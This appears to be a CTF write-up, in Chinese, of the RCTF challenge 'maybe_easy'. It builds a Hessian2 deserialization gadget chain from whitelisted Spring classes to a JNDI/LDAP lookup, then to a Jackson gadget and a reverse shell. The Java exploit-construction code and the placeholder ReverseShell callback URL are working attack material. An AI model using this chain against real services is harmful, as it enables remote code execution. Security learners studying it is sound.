# maybe_easy

## 题目简述

服务端使用 Hessian2 反序列化客户端提交的对象，并通过包名前缀白名单限制可加载的类。题目同时提供了 `Maybe`：它继承 `Proxy`、实现 `Comparable`，且 `compareTo` 会把调用转交给内部的 `InvocationHandler`。目标是在白名单允许的 Spring 类中拼出调用链，再借助反序列化容器自动触发比较操作，最终完成 JNDI 注入和命令执行。

## 解题过程

### 从 `Maybe.compareTo` 找触发点

关键业务类的逻辑可以压缩为：

```java
public class Maybe extends Proxy implements Comparable<Object>, Serializable {
    public Maybe(InvocationHandler h) {
        super(h);
    }

    public int compareTo(Object o) {
        try {
            Method m = Comparable.class.getMethod("compareTo", Object.class);
            return (Integer) this.h.invoke(this, m, new Object[]{o});
        } catch (Throwable e) {
            throw new RuntimeException(e);
        }
    }
}
```

Hessian 工厂允许的包名前缀包括：

```text
com.rctf.server.tool.
java.util.
org.apache.commons.logging.
org.springframework.beans.
org.springframework.jndi.
```

因此，问题不是寻找常见的任意第三方反序列化链，而是让 `Maybe.compareTo` 逐层进入这些被允许的 Spring 类型。

### 在白名单中拼出 JNDI 调用链

可用的三个关键对象分别是：

1. `AutowireUtils$ObjectFactoryDelegatingInvocationHandler`：代理方法被调用时执行 `objectFactory.getObject()`；
2. `ObjectFactoryCreatingFactoryBean$TargetBeanObjectFactory`：其 `getObject()` 执行 `beanFactory.getBean(targetBeanName)`；
3. `SimpleJndiBeanFactory`：把传入的 bean 名称视为 JNDI 名称，并经 `JndiTemplate.lookup()` 发起查询。

组合后的决定性调用链为：

```text
Maybe.compareTo
  -> ObjectFactoryDelegatingInvocationHandler.invoke
  -> TargetBeanObjectFactory.getObject
  -> SimpleJndiBeanFactory.getBean("ldap://<ldap-server>/...")
  -> JndiTemplate.lookup
  -> LDAP 返回序列化对象
  -> Jackson 反序列化 gadget
  -> 命令执行
```

两个内部类的构造器都不是公开 API，可以通过反射创建：

```java
SimpleJndiBeanFactory beanFactory = new SimpleJndiBeanFactory();
String jndi = "ldap://<ldap-server>:1389/Deserialize/Jackson/ReverseShell/"
            + "<callback-host>/<callback-port>";

Class<?> targetClass = Class.forName(
    "org.springframework.beans.factory.config."
  + "ObjectFactoryCreatingFactoryBean$TargetBeanObjectFactory");
Constructor<?> targetCtor = targetClass.getDeclaredConstructor(
    BeanFactory.class, String.class);
targetCtor.setAccessible(true);
ObjectFactory objectFactory = (ObjectFactory) targetCtor.newInstance(
    beanFactory, jndi);

Class<?> handlerClass = Class.forName(
    "org.springframework.beans.factory.support."
  + "AutowireUtils$ObjectFactoryDelegatingInvocationHandler");
Constructor<?> handlerCtor = handlerClass.getDeclaredConstructor(
    ObjectFactory.class);
handlerCtor.setAccessible(true);
InvocationHandler handler = (InvocationHandler) handlerCtor.newInstance(
    objectFactory);

Maybe maybe = new Maybe(handler);
```

### 用反序列化容器触发比较

原 PDF 使用 `PriorityQueue`：先放入两个普通整数建立合法队列，再把内部 `queue` 数组替换成两个 `Maybe`。Hessian 反序列化恢复队列时会整理堆并触发元素比较，于是进入 `Maybe.compareTo`：

```java
PriorityQueue<Object> queue = new PriorityQueue<>(2);
queue.add(1);
queue.add(1);

Field f = PriorityQueue.class.getDeclaredField("queue");
f.setAccessible(true);
f.set(queue, new Object[]{maybe, maybe});

String payload = HessianFactory.serialize(queue);
```

仓库中的官方 POC 还给出了 `TreeMap` 变体。两者的作用相同：反序列化恢复有序结构时自动调用 `compareTo`；实际构造时任选与目标 JDK、Hessian 实现兼容的一种即可。

将生成的 Hessian 数据提交给服务后，LDAP 端会收到形如
`/Deserialize/Jackson/ReverseShell/<callback-host>/<callback-port>` 的查询。题目环境为 JDK 8，并允许后续 Jackson 序列化对象，因此 LDAP 返回相应 gadget 后可获得反弹 shell。进入容器读取 `/F0lg.txt`，得到：

```text
RCTF{M@gBe-7H1s_TiU2:FIey:hE1HeI}
```

原 PDF 中有两处 `image.png` 直接显示为损坏图片占位符，并不包含可恢复的步骤信息；其余终端截图只用于证明 LDAP 请求和读取 flag，相关信息已转写到正文，因此不再依赖这些截图。

## 方法总结

这题的关键不是“白名单是否存在”，而是白名单内的类能否跨接口串成危险调用。看到可控 `Comparable`、代理 `InvocationHandler` 和会在反序列化期间排序的容器时，应先画出自动调用路径，再枚举白名单中的 `InvocationHandler`、`ObjectFactory` 与 `BeanFactory` 实现。`PriorityQueue` 和 `TreeMap` 只是触发器，真正的利用骨架是 `compareTo -> InvocationHandler -> ObjectFactory -> BeanFactory -> JNDI`。
